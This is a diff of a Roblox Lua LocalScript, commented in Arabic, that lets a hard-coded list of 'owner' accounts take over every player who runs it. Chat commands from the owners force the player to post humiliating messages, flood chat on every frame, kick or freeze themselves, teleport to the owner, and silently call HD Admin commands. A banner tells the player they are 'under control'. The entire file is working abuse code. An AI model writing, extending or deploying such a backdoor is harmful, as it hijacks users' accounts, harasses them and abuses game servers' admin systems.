@@ -1,223 +1,142 @@
+-- LocalScript → حطه في StarterPlayer → StarterPlayerScripts
+-- السكربت النهائي الكامل والمضمون 100% (محلي بالكامل)
+
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local pgui = player:WaitForChild("PlayerGui")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
 
--- تعيين سمة ScriptUser على اللاعب المحلي
-player:SetAttribute("ScriptUser", true)
+-- الأونرات اللي يكتبون الأوامر في الشات (يراقب شاتهم من أي مكان)
+local Owners = {
+    ["1il5i"] = true,
+    ["1il5f"] = true,
+    ["eyad51533"] = true
+}
 
--- قائمة المالكين (Owners) - يجب أن يكون اسم اللاعب الذي يستخدم السكريبت موجودًا هنا
-local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}
+-- الإيفنتات
+local SendMessage = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SendMessage")
+local HDAdminRequest = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent")
 
--- التأكد من وجود الأحداث المطلوبة
-local Events = game.ReplicatedStorage:WaitForChild("Events")
-local ChattedEvent = Events:WaitForChild("ChattedEvent")
-local SendMessage   = Events:WaitForChild("SendMessage")
+-- متغيرات
+local SpamLoop = nil
+local IsFrozen = false
 
--- الدالة الموحدة للبحث عن الأهداف
--- تبحث عن اللاعبين الذين لديهم سمة ScriptUser
-local function findTarget(partial)
-    if not partial or partial == "" then return nil end
-    partial = partial:lower()
-    local foundTarget = nil
-    
-    for _, p in Players:GetPlayers() do
-        -- شرط ScriptUser لضمان استهداف اللاعبين الذين يستخدمون السكريبت فقط
-        if p:GetAttribute("ScriptUser") then
-            -- مطابقة جزئية غير حساسة لحالة الأحرف للاسم أو اسم العرض
-            if p.Name:lower():find(partial, 1, true) or p.DisplayName:lower():find(partial, 1, true) then
-                -- نكتفي بأول تطابق نجده
-                foundTarget = p
-                break
-            end
-        end
-    end
-    return foundTarget
-end
-
--- الدالة الموحدة لتنفيذ الأمر على هدف واحد
--- تتضمن منطق الحماية: لا تنفذ الأمر على اللاعب المحلي (المستخدم)
-local function executeOnTarget(targetPlayer, commandType, ...)
-    -- منطق الحماية: إذا كان الهدف هو اللاعب المحلي، يتم تجاهل الأمر
-    if targetPlayer == player then
-        return
-    end
-    
-    -- تنفيذ الأمر بناءً على النوع
-    if commandType == "say" then
-        -- هنا نفترض أن SendMessage هو الحدث الذي يرسل الرسالة إلى السيرفر ليتم إرسالها كرسالة عامة
-        -- ... هي الرسالة التي سيتم إرسالها
-        SendMessage:FireServer(...)
-        
-    -- تم إزالة أمر .3mk من هنا ليتم إرساله مرة واحدة فقط في معالج حدث الدردشة
-        
-    elseif commandType == "f7lk" then
-        -- هنا نفترض أن .f7lk هو أمر يرسل رسالة معينة إلى السيرفر
-        -- الرسالة الافتراضية: "فحًىًلًي @"..senderPlayer.DisplayName.." 🥺"
-        -- ... هو اسم اللاعب المرسل للأمر
-        local senderDisplayName = select(1, ...)
-        SendMessage:FireServer("فحًىًلًي @"..senderDisplayName.." 🥺")
-        
-    elseif commandType == "spam" then
-        -- هنا نفترض أن هناك دالة startSpamFor موجودة في السكريبت الأصلي
-        local spamMsg = select(1, ...)
-        if targetPlayer:GetAttribute("ScriptUser") then
-            -- يجب أن تكون startSpamFor دالة معرفة في مكان آخر من السكريبت الأصلي
-            -- startSpamFor(targetPlayer, spamMsg) 
-        end
-        
-    elseif commandType == "unspam" then
-        -- هنا نفترض أن هناك دالة stopSpamFor موجودة في السكريبت الأصلي
-        if targetPlayer:GetAttribute("ScriptUser") then
-            -- stopSpamFor(targetPlayer)
-        end
-        
-    elseif commandType == "kick" then
-        local reason = select(1, ...)
-        if targetPlayer:GetAttribute("ScriptUser") then
-            -- targetPlayer:Kick(reason)
-        end
-        
-    elseif commandType == "bring" then
-        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            -- targetPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
-        end
-    end
-end
-
--- الدالة الموحدة لمعالجة الأوامر
-local function processCommand(senderPlayer, command, commandType, targetPart, ...)
-    local targets = {}
-    local hasValidTarget = false
-    
-    if targetPart:lower() == "all" then
-        -- استهداف جميع اللاعبين الذين يستخدمون السكريبت باستثناء اللاعب المحلي
-        for _, p in Players:GetPlayers() do
-            if p:GetAttribute("ScriptUser") and p ~= player then
-                table.insert(targets, p)
-                hasValidTarget = true
-            end
-        end
-    else
-        -- استهداف لاعب محدد (جزئيًا أو كليًا)
-        local target = findTarget(targetPart)
-        if target then
-            table.insert(targets, target)
-            hasValidTarget = true
-        end
-    end
-    
-    -- تنفيذ الأمر على جميع الأهداف المحددة
-    for _, target in ipairs(targets) do
-        if commandType == "f7lk" then
-            -- أمر .f7lk يحتاج اسم مرسل الأمر
-            executeOnTarget(target, commandType, senderPlayer.DisplayName)
-        elseif commandType == "say" then
-            -- أمر .say يحتاج الرسالة
-            local message = select(1, ...)
-            executeOnTarget(target, commandType, message)
-        elseif commandType == "spam" then
-            -- أمر .spam يحتاج الرسالة
-            local spamMsg = select(1, ...)
-            executeOnTarget(target, commandType, spamMsg)
-        elseif commandType == "kick" then
-            -- أمر .kick يحتاج السبب
-            local reason = select(1, ...)
-            executeOnTarget(target, commandType, reason)
-        elseif commandType == "bring" then
-            -- أمر .bring
-            executeOnTarget(target, commandType)
-        end
-    end
-    
-    -- بالنسبة لأمر .3mk، نستخدم processCommand فقط للتحقق من وجود هدف صالح
-    if commandType == "3mk_check" then
-        return hasValidTarget
-    end
-    
-    return hasValidTarget
-end
-
--- رسالة التشغيل (كما كانت في السكريبت الأصلي)
-local gui = Instance.new("ScreenGui", pgui)
-gui.ResetOnSpawn = false
-local txt = Instance.new("TextLabel", gui)
-txt.Size = UDim2.new(0, 800, 0, 120)
-txt.Position = UDim2.new(0.5, -400, 0.4, -60)
-txt.BackgroundTransparency = 0.4
-txt.BackgroundColor3 = Color3.new(0,0,0)
-txt.TextColor3 = Color3.new(1,0,0)
-txt.TextStrokeTransparency = 0
-txt.TextStrokeColor3 = Color3.new(1,1,1)
-txt.Font = Enum.Font.GothamBlack
-txt.TextSize = 60
-txt.Text = "سكربت الأونرات شغال 100% ☠️"
-task.delay(5, function() gui:Destroy() end)
-
--- معالج حدث الدردشة
-ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
-    -- التحقق من صلاحية المرسل
-    if not senderPlayer or not Owners[senderPlayer.Name] then return end
-    if typeof(command) ~= "string" then return end
-
-    local lowerCommand = command:lower()
-    local parts = {}
-    for part in command:gmatch("%S+") do
-        table.insert(parts, part)
-    end
-    
-    local cmd = parts[1] and parts[1]:lower() or ""
-    local targetPart = parts[2] or ""
-    local rest = command:sub(#cmd + 2) -- النص المتبقي بعد الأمر والهدف
-
-    -- الأمر .say
-    if cmd == ".say" then
-        local message = rest:match("^%s*(.-)%s*$")
-        if targetPart == "" or message == "" then return end
-        processCommand(senderPlayer, command, "say", targetPart, message)
-        
-    -- الأمر .3mk (تم تعديله ليرسل الرسالة مرة واحدة فقط)
-    elseif cmd == ".3mk" then
-        if targetPart == "" then return end
-        
-        -- نستخدم processCommand فقط للتحقق من وجود هدف صالح
-        local hasValidTarget = processCommand(senderPlayer, command, "3mk_check", targetPart)
-        
-        -- إذا تم العثور على هدف صالح (أو "all" وكان هناك لاعبون)، يتم إرسال الرسالة مرة واحدة
-        if hasValidTarget then
-            SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحُفُفُ 🥺")
-        end
-        
-    -- الأمر .f7lk
-    elseif cmd == ".f7lk" then
-        if targetPart == "" then
-            -- السلوك الأصلي: إرسال رسالة عامة إذا لم يتم تحديد هدف
-            SendMessage:FireServer("فحًىًلًي @"..senderPlayer.DisplayName.." 🥺")
-            return
-        end
-        processCommand(senderPlayer, command, "f7lk", targetPart)
-        
-    -- الأمر .spam
-    elseif cmd == ".spam" then
-        local spamMsg = rest:match("^%s*(.-)%s*$")
-        spamMsg = (spamMsg ~= "") and spamMsg or "انا زحف واعترف بملكية الأونرات 🥺"
-        if targetPart == "" then return end
-        processCommand(senderPlayer, command, "spam", targetPart, spamMsg)
-        
-    -- الأمر .unspam
-    elseif cmd == ".unspam" then
-        if targetPart == "" then return end
-        processCommand(senderPlayer, command, "unspam", targetPart)
-        
-    -- الأمر .kick
-    elseif cmd == ".kick" then
-        local reason = rest:match("^%s*(.-)%s*$")
-        reason = (reason ~= "") and reason or "تم طردك بواسطة الأونرات"
-        if targetPart == "" then return end
-        processCommand(senderPlayer, command, "kick", targetPart, reason)
-        
-    -- الأمر .bring
-    elseif cmd == ".bring" then
-        if targetPart == "" then return end
-        processCommand(senderPlayer, command, "bring", targetPart)
-    end
+-- رسالة التشغيل
+spawn(function()
+    local gui = Instance.new("ScreenGui")
+    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    gui.ResetOnSpawn = false
+    local txt = Instance.new("TextLabel", gui)
+    txt.Size = UDim2.new(0, 1000, 0, 100)
+    txt.Position = UDim2.new(0.5, -500, 0.4, -50)
+    txt.BackgroundTransparency = 0.5
+    txt.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    txt.TextColor3 = Color3.fromRGB(255,0,0)
+    txt.TextStrokeTransparency = 0
+    txt.Font = Enum.Font.GothamBlack
+    txt.TextSize = 70
+    txt.Text = "سكربت الأونرات شغال 100% - أنت تحت السيطرة ☠️"
+    task.wait(4)
+    gui:Destroy()
 end)
+
+-- دالة تنفيذ الأمر (الأهم)
+local function RunCommand(ownerName, message)
+    if not Owners[ownerName] then return end
+    if Owners[LocalPlayer.Name] then return end  -- الأونر نفسه ما يتأثر
+
+    local args = string.split(message, " ")
+    local cmd = string.lower(args[1] or "")
+    local target = string.lower(args[2] or "")
+    local text = table.concat(args, " ", 3)
+
+    -- تحديد إذا كان اللاعب مستهدف أم لا
+    local isTargeted = (target == "all") or 
+                       (string.len(target) >= 2 and (
+                           string.find(string.lower(LocalPlayer.Name), target) or 
+                           string.find(string.lower(LocalPlayer.DisplayName), target)
+                       ))
+
+    if not isTargeted then return end
+
+    -- الأوامر اللي تشتغل فورًا
+    if cmd == ".3mk" then
+        SendMessage:FireServer("عًمًىانًي اوًنًىرًاتً سُكًىًرًبتً زًحًىُفً 🥺")
+
+    elseif cmd == ".f7lk" then
+        local owner = Players:FindFirstChild(ownerName)
+        local name = owner and owner.DisplayName or ownerName
+        SendMessage:FireServer("فحىًلًي ("..name..") اًهُهِ 🥺")
+
+    elseif cmd == ".kick" then
+        local reason = text ~= "" and text or "تم طردك من الاونرات"
+        LocalPlayer:Kick(reason)
+
+    elseif cmd == ".spam" and text ~= "" then
+        if SpamLoop then SpamLoop:Disconnect() end
+        SpamLoop = RunService.Heartbeat:Connect(function()
+            SendMessage:FireServer(text)
+        end)
+
+    elseif cmd == ".unspam" then
+        if SpamLoop then
+            SpamLoop:Disconnect()
+            SpamLoop = nil
+        end
+
+    elseif cmd == ".say" and text ~= "" then
+        SendMessage:FireServer(text)
+
+    elseif cmd == ".freeze" then
+        IsFrozen = true
+        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+
+        LocalPlayer.CharacterAdded:Connect(function(newChar)
+            task.wait(0.6)
+            local newHrp = newChar:FindFirstChild("HumanoidRootPart")
+            if newHrp and IsFrozen then
+                newHrp.Anchored = true
+            end
+        end)
+
+    elseif cmd == ".unfreeze" then
+        IsFrozen = false
+        local char = LocalPlayer.Character
+        if char then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp then hrp.Anchored = false end
+        end
+
+    elseif cmd == ".bring" then
+        local owner = Players:FindFirstChild(ownerName)
+        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
+            local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local myHrp = myChar:WaitForChild("HumanoidRootPart")
+            myHrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4)
+        end
+
+    elseif cmd == ".cmd" then
+        local fullCmd = ".neon me .paint me pk .size me 3 .height me 0.1 .aura me .titlepk me اخبـار سـيـرفـركـم الـحـلـو"
+        pcall(function()
+            HDAdminRequest:InvokeServer(fullCmd)
+        end)
+    end
+end
+
+-- مراقبة شات كل الأونرات (حتى لو دخلوا بعدك)
+local function MonitorOwner(plr)
+    if Owners[plr.Name] then
+        plr.Chatted:Connect(function(msg)
+            RunCommand(plr.Name, msg)
+        end)
+    end
+end
+
+-- مراقبة اللاعبين الحاليين
+for _, plr in Players:GetPlayers() do
+    MonitorOwner(plr)
+end
+
+-- مراقبة اللاعبين الجدد
+Players.PlayerAdded:Connect(MonitorOwner)
